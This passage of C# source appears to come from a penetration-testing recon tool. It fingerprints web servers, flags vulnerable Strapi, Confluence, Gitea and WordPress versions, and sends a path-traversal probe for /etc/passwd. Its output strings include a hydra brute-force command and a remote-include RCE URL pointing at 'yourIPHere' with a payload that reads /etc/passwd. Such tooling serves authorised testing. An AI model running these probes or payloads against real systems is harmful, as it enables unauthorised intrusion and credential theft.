                    else if (serverText.StartsWith("CouchDB/"))
                    {
                        responseText += "-- CouchDB Detected!" + Environment.NewLine;
                        var utilsPage = GetHTTPInfo($"{URL}_utils/");
                        if (utilsPage.StatusCode == HttpStatusCode.OK || utilsPage.StatusCode == HttpStatusCode.NotModified)
                        {
                            responseText += "--- " + $"Web Admin Tool Found: {utilsPage.URL}".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        var allDBsPage = GetHTTPInfo($"{URL}_all_dbs");
                        if (allDBsPage.StatusCode == HttpStatusCode.OK)
                        {
                            string allDBsPageText = allDBsPage.PageText.Trim(Environment.NewLine.ToCharArray());
                            responseText += "--- " + $"All DBs Found ( {allDBsPage.URL} ) : {allDBsPageText}".Pastel(Color.Orange) + Environment.NewLine;
                            responseText += $"--- Enumeration: {URL}dbNameHere/_all_docs" + Environment.NewLine;
                            // ID or Key Name? They both seem to be the same in test scnearios...
                            responseText += $"--- Enumeration: {URL}dbNameHere/idHere" + Environment.NewLine;
                        }
                    }
                }
                // All the X's
                if (Headers.Any(x => x.Key == "X-Powered-By"))
                {
                    string poweredBy = Headers.GetValues("X-Powered-By").First();
                    Headers.Remove("X-Powered-By");

                    // JBoss
                    responseText += "- X-Powered-By: " + poweredBy + Environment.NewLine;
                    if (poweredBy.Contains("JBoss"))
                    {
                        responseText += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Pastel(Color.Orange) + Environment.NewLine;
                    }
                    // Strapi
                    else if (poweredBy == "Strapi <strapi.io>")
                    {
                        responseText += "-- " + "Strapi detected".Pastel(Color.Orange) + Environment.NewLine;
                        var versionCheck = Web.GetHTTPInfo($"{URL.Trim('/')}/admin/init");
                        if (versionCheck.StatusCode == HttpStatusCode.OK)
                        {
                            string versionJson = versionCheck.PageText;
                            try
                            {
                                var versionData = JsonDocument.Parse(versionJson);
                                string versionText = versionData.RootElement.GetProperty("data").GetProperty("strapiVersion").GetString();
                                responseText += "--- Version: " + versionText + Environment.NewLine;
                                if (versionText == "3.0.0-beta.17.4")
                                {
                                    // CVE-2019-18818, CVE-2019-19609
                                    responseText += "---- " + "Vulnerable Version Detected (Unauthenticated RCE!) - Run https://www.exploit-db.com/exploits/50239".Pastel(Color.Orange) + Environment.NewLine;
                                }
                                else if (versionText == "3.0.0-beta.17.7")
                                {
                                    // CVE-2019-19609 (Auth'd)
                                    responseText += "----" + "Vulnerable Version Detected (Authenticated RCE) - https://www.exploit-db.com/exploits/50238".Pastel(Color.Orange) + Environment.NewLine;
                                }
                                else
                                {
                                    responseText += "---- Vulnerable if before 3.0.0-beta.17.8 - Bug Reelix!" + Environment.NewLine;
                                }
                            }
                            catch (Exception ex)
                            {
                                responseText += "--- Error - Version isn't formatted correctly: " + ex.Message + Environment.NewLine;
                            }
                        }
                    }
                }
                // Kubernetes
                if (Headers.Any(x => x.Key.StartsWith("X-Kubernetes-")))
                {
                    responseText += "-- Kubernetes Detected".Pastel(Color.Orange) + Environment.NewLine;
                    var versionCheck = GetHTTPInfo($"{URL}version");
                    if (versionCheck.StatusCode == HttpStatusCode.OK)
                    {
                        var versionData = JsonDocument.Parse(versionCheck.PageText);
                        string major = versionData.RootElement.GetProperty("major").GetString();
                        string minor = versionData.RootElement.GetProperty("minor").GetString();
                        responseText += $"--" + "Version: {major}.{minor} (In /version)".Pastel(Color.Orange) + Environment.NewLine;
                    }
                    responseText += "---" + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
                    responseText += "--- " + "If you do, read: https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" + Environment.NewLine;

                }
                // Influxdb
                if (Headers.Any(x => x.Key.StartsWith("X-Influxdb-Version")))
                {
                    string influxDBVersion = Headers.GetValues("X-Influxdb-Version").First();
                    Headers.Remove("X-Influxdb-Version");
                    responseText += "- InfluxDB Detected - Version: " + influxDBVersion + Environment.NewLine;
                    Version theVersion = new Version(influxDBVersion);
                    if (theVersion <= new Version("1.3.0"))
                    {
                        responseText += "-- " + "Possible Vulnerable Version Detected - https://www.komodosec.com/post/when-all-else-fails-find-a-0-day <-----".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }
                // All the rest
                if (Headers.Any(x => x.Key.StartsWith("X-")))
                {
                    while (Headers.Any(x => x.Key.StartsWith("X-")))
                    {
                        var theHeader = Headers.First(x => x.Key.StartsWith("X-"));
                        string headerName = theHeader.Key;
                        if (headerName != "X-Content-Type-Options") // Not really useful
                        {
                            string headerValues = string.Join(",", Headers.GetValues(headerName));
                            responseText += $"- {headerName}: {headerValues}{Environment.NewLine}";
                        }
                        Headers.Remove(theHeader.Key);
                    }
                }
                // Requires a login
                if (Headers.Any(x => x.Key == "WWW-Authenticate"))
                {
                    string wwwAuthenticate = Headers.WwwAuthenticate.ToString();
                    Headers.Remove("WWW-Authenticate");
                    responseText += "- WWW-Authenticate: " + wwwAuthenticate + Environment.NewLine;
                }
                // Kabana
                if (Headers.Any(x => x.Key == "kbn-name"))
                {
                    string kbnName = Headers.GetValues("kbn-name").ToString();
                    Headers.Remove("kbn-name");
                    responseText += "- kbn-name: " + kbnName + Environment.NewLine;
                    responseText += "-- You should get more kibana-based info further down" + Environment.NewLine; ;
                }
                if (Headers.Any(x => x.Key == "kbn-version"))
                {
                    string kbnVersion = Headers.GetValues("kbn-version").ToString();
                    Headers.Remove("kbn-version");
                    responseText += "- kbn-version: " + kbnVersion + Environment.NewLine;
                }
                // Useful cookies
                if (Headers.Any(x => x.Key == "Set-Cookie"))
                {
                    string setCookie = Headers.GetValues("Set-Cookie").First();
                    Headers.Remove("Set-Cookie");
                    responseText += "- Set-Cookie: " + setCookie + Environment.NewLine;
                    if (setCookie.StartsWith("CUTENEWS_SESSION"))
                    {
                        responseText += "-- " + $"CuteNews Found - Browse to {urlPrefix}://{DNS}/CuteNews/index.php".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }
                // Fun content types
                if (Headers.Any(x => x.Key == "Content-Type"))
                {
                    string contentType = Headers.GetValues("Content-Type").First();
                    if (contentType.StartsWith("text/html"))
                    {
                        // Skip it
                    }
                    else if (contentType.StartsWith("image"))
                    {
                        // The entire thing is an image - It's special!
                        responseText += "- Content Type: " + contentType.Pastel(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
                    }
                    else
                    {
                        // A unique content type - Might be interesting
                        responseText += "- Content-Type: " + contentType + Environment.NewLine;
                    }
                }
                string otherHeaders = "";
                foreach (var header in Headers)
                {
                    otherHeaders += header.Key + ",";
                }
                otherHeaders = otherHeaders.Trim(',');
                responseText += "- Other Headers: " + otherHeaders + Environment.NewLine;
            }

            // Page Text (Body)
            if (PageText.Length > 0)
            {
                if (PageText.Length < 250)
                {
                    responseText += "- Page Text: " + PageText.Trim() + Environment.NewLine;
                }

                // concrete5
                if (PageText.Contains("<meta name=\"generator\" content=\"concrete5 - "))
                {
                    responseText += "- " + "concrete5 CMS detected!".Pastel(Color.Orange) + Environment.NewLine;
                    // <meta name="generator" content="concrete5 - 8.5.2"/>
                    string versionInfo = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"concrete5 - "));
                    versionInfo = versionInfo.Remove(0, versionInfo.IndexOf("concrete5 - ") + 12);
                    versionInfo = versionInfo.Substring(0, versionInfo.IndexOf("\""));
                    responseText += "-- Version: " + versionInfo + Environment.NewLine;
                    if (versionInfo == "8.5.2")
                    {
                        responseText += "---" + " Vulnerable version detected - Vulnerable to CVE-2020-24986 - https://hackerone.com/reports/768322".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }

                // Confluence
                if (PageText.Contains("Printed by Atlassian Confluence"))
                {
                    string confluenceVersionText = PageText.Remove(0, PageText.IndexOf("Printed by Atlassian Confluence ") + 32);
                    confluenceVersionText = confluenceVersionText.Substring(0, confluenceVersionText.IndexOf("</li>"));
                    Version version = Version.Parse(confluenceVersionText);

                    // CVE-2022-26134 (Version on the right is fixed)
                    // 1.3.0 -> 7.4.17
                    // 7.13.0 -> 7.13.7
                    // 7.14.0 -> 7.14.3 
                    // 7.15.0 -> 7.15.2 
                    // 7.16.0 -> 7.16.4
                    // 7.17.0 -> 7.17.4
                    // 7.18.0 -> 7.18.1 
                    bool isVulnerable = false;
                    if (version >= Version.Parse("1.3.0") && version < Version.Parse("7.4.17"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.13.0") && version < Version.Parse("7.13.7"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.14.0") && version < Version.Parse("7.14.3"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.15.0") && version < Version.Parse("7.15.2"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.16.0") && version < Version.Parse("7.16.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.17.0") && version < Version.Parse("7.17.4"))
                    {
                        isVulnerable = true;
                    }
                    else if (version >= Version.Parse("7.18.0") && version < Version.Parse("7.18.1"))
                    {
                        isVulnerable = true;
                    }

                    if (isVulnerable)
                    {
                        responseText += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} -> https://github.com/Nwqda/CVE-2022-26134".Pastel(Color.Orange) + Environment.NewLine;
                    }
                }

                // Gitea
                // Cookie Title Added: i_like_gitea
                if (PageText.Contains("Powered by Gitea"))
                {
                    responseText += "- " + "Gitea detected!".Pastel(Color.Orange) + Environment.NewLine;
                    if (PageText.Contains("AppVer: '") && PageText.Contains("AppSubUrl:"))
                    {
                        string giteaVersion = PageText.Remove(0, PageText.IndexOf("AppVer: '") + 9);
                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
                        Version theVersion = System.Version.Parse(giteaVersion);
                        // Version: >= 1.1.0 to <= 1.12.5
                        if (theVersion.Major == 1 && theVersion.Minor <= 12)
                        {
                            responseText += "-- " + $"Vulnerable Gitea Version Detected {giteaVersion} -> https://www.exploit-db.com/raw/49571".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        responseText += "-- Non Vulnerable Version Detected: " + giteaVersion + Environment.NewLine;
                        responseText += "-- If you gain access, see if you can alter gitea.db (User table)" + Environment.NewLine;
                    }
                }

                // Icecast
                if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
                {
                    responseText += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
                    responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                }

                // Joomla!
                if (PageText.Contains("com_content") && PageText.Contains("com_users"))
                {
                    responseText += "- " + "Joomla! Detected".Pastel(Color.Orange) + Environment.NewLine;
                    var adminXML = GetHTTPInfo($"{URL}administrator/manifests/files/joomla.xml");
                    if (adminXML.StatusCode == HttpStatusCode.OK)
                    {
                        if (adminXML.PageText.Contains("<version>") && adminXML.PageText.Contains("</version>"))
                        {
                            string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
                            versionText = versionText.Substring(0, versionText.IndexOf("</version"));
                            responseText += $"-- Joomla! Version: {versionText}".Pastel(Color.Orange) + Environment.NewLine;
                        }
                    }
                    else
                    {
                        var tinyXML = GetHTTPInfo($"{URL}plugins/editors/tinymce/tinymce.xml");
                        if (tinyXML.StatusCode == HttpStatusCode.OK)
                        {
                            // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
                            responseText += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
                        }
                    }
                }

                // Wordpress
                //if (PageText.Contains("/wp-content/themes/") && (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\")))
                // Some Wordpress pages don't contain "wp-content" (Ref: HTB Acute)
                if (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\"))
                {
                    responseText += "- " + "Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
                    // Basic User Enumeration - Need to combine these two...
                    List<string> wpUsers = new();
                    var wpUserTestOne = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-json/wp/v2/users");
                    if (wpUserTestOne.StatusCode == HttpStatusCode.OK)
                    {
                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
                        foreach (JsonElement element in document.RootElement.EnumerateArray())
                        {
                            string wpUserName = element.GetProperty("name").GetString();
                            string wpUserSlug = element.GetProperty("slug").GetString();
                            if (!wpUsers.Contains(wpUserName))
                            {
                                wpUsers.Add(wpUserSlug);
                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
                            }
                        }
                    }
                    var wpUserTestTwo = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/index.php/wp-json/wp/v2/users");
                    if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
                    {
                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
                        foreach (JsonElement element in document.RootElement.EnumerateArray())
                        {
                            string wpUserName = element.GetProperty("name").GetString();
                            string wpUserSlug = element.GetProperty("slug").GetString();
                            if (!wpUsers.Contains(wpUserName))
                            {
                                wpUsers.Add(wpUserSlug);
                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
                            }
                        }
                    }

                    // Basic vulnerable addons
                    if (PageText.Contains("/wp-with-spritz/"))
                    {
                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                    }
                    else if (PageText.Contains("/wp-content/plugins/social-warfare"))
                    {
                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
                        responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
                    }

                    // Check for public folders
                    var contentDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/");
                    if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
                    {
                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
                    }
                    var pluginsDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/plugins/");
                    if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
                    {
                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
                    }

                    responseText += $"-- User Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5" + Environment.NewLine;
                    responseText += $"-- Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate p" + Environment.NewLine;
                    responseText += $"-- User + Plugin Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5,p" + Environment.NewLine;

                    // Checking for wp-login.php
                    var wplogin = GetHTTPInfo($"{urlPrefix}://{DNS}/wp-login.php");
                    string wpLoginPath = "/blog/wp-login.php";
                    if (wplogin.StatusCode == HttpStatusCode.OK && wplogin.PageText.Contains("action=lostpassword"))
                    {
                        wpLoginPath = "/wp-login.php";
                    }
                    responseText += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
                }

            }

            // SSL Cert
            if (SSLCert != null)
            {
                X509Certificate2 theCert = SSLCert;
                string certIssuer = theCert.Issuer;
                string certSubject = theCert.Subject;
                // string certAltName = SSLCert.SubjectName.Name;
                responseText += "- SSL Cert Issuer: " + certIssuer + Environment.NewLine;
                responseText += "- SSL Cert Subject: " + certSubject + Environment.NewLine;
                if (theCert.Extensions != null)
                {
                    // Console.WriteLine("Extensions is not null");
                    X509ExtensionCollection extensionCollection = theCert.Extensions;
                    foreach (X509Extension extension in extensionCollection)
                    {
                        // Oid.FriendlyName (Note: Can be null)
                        // - Windows: Subject Alternative Name
                        // - Linux: X509v3 Subject Alternative Name
                        // - Note: Only in English - Not cross-language friendly :(
                        // Subject Alternative Name == Oid 2.5.29.17
                        if (extension.Oid.Value == "2.5.29.17")
                        {
                            AsnEncodedData asndata = new(extension.Oid, extension.RawData);
                            List<string> formattedValues = asndata.Format(true).Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                            string itemList = "";
                            foreach (string item in formattedValues)
                            {
                                string theItem = item;
                                theItem = theItem.Replace("DNS Name=", "");
                                if (theItem.Contains("("))
                                {
                                    theItem = theItem.Remove(0, theItem.IndexOf("(") + 1).Replace(")", "");
                                    itemList += theItem + ",";
                                }
                                else
                                {
                                    itemList += theItem + ",";
                                }
                            }
                            itemList = itemList.Trim(',');
                            responseText += "- Subject Alternative Name: " + itemList + Environment.NewLine;
                        }
                    }
                }
            }
            // Clean off any redundant newlines
            responseText = responseText.TrimEnd(Environment.NewLine.ToCharArray());
            return responseText;
        }

        public static string TestBaseLFI(string ip, int port)
        {
            string result = General.BannerGrab(ip, port, "GET /../../../../../../etc/passwd HTTP/1.1" + Environment.NewLine + "Host: " + ip + Environment.NewLine + Environment.NewLine, 2500);
            if (result.Contains("root"))
            {
                return "- /etc/passwd File Found VIA Base LFI! --> GET /../../../../../../etc/passwd" + Environment.NewLine + result;
                // Need to format this better...

            }
            // Windows 1 (Windows app running on Windows)
            result = General.BannerGrab(ip, port, "GET /../../../../../../windows/win.ini HTTP/1.1\r\nHost: " + ip + "\r\n\r\n", 2500);
            if (result.Contains("for 16-bit app support"))
            {
                return "- /windows/win.ini File Found VIA Base LFI! --> GET /../../../../../../windows/win.ini" + Environment.NewLine + result;
            }
            // Windows 2 (Linux app running on Windows)
            result = General.BannerGrab(ip, port, "GET /../../../../../../windows/win.ini HTTP/1.1\nHost: " + ip + "\n\n", 2500);
            if (result.Contains("for 16-bit app support"))
            {
                return "- /windows/win.ini File Found VIA Base LFI! --> GET /../../../../../../windows/win.ini" + Environment.NewLine + result;
            }
            return "";
        }

        public static bool BasicHTTPSTest(string target, int port)
        {
            try
            {
                // HttpWebRequest has the ability to ignore invalid SSL Certs - WebRequest doesn't
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://{target}:{port}/");
                // HEAD request - Faster
                request.Method = "HEAD";
                // Ignore invalid SSL Certs
                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                WebResponse r = request.GetResponse();
                return true;
            }
            catch
            {
                // Nope
                return false;
            }
        }
    }
}
